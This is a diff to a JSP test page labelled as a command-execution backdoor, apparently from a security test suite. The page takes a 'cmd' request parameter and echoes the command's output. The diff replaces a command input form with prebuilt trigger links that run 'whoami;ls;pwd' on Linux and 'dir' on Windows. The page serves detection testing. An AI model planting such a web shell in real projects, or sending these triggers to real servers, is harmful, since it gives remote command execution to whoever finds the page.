@@ -10,6 +10,8 @@
 <body>
     <h1>004 - 命令执行后门（有回显）</h1>
 <%
+String linux_querystring = "?cmd=whoami%3bls%3bpwd";
+String windows_querystring = "?cmd=dir";
 String output = "";
 String cmd    = request.getParameter ("cmd");
 if (cmd != null)
@@ -37,12 +39,12 @@ if (cmd != null)
     cmd = "whoami;ls;pwd";
 }
 %>
-<div>    
-
-<form method=POST>
-<label>输入要执行的命令，敲回车即可</label>
-<input name=cmd style="width: 100%" autofocus value="<%=cmd %>"></input>
-</form>
+<div>
+    <p>Linux 触发: </p>
+    <a href="<%=request.getRequestURL()+linux_querystring%>" target="_blank"><%=request.getRequestURL()+linux_querystring%></a>
+    <br>
+    <p>Windows 触发: </p>
+    <a href="<%=request.getRequestURL()+windows_querystring%>" target="_blank"><%=request.getRequestURL()+windows_querystring%></a>
 <pre>
 <%=output %>
 </pre>
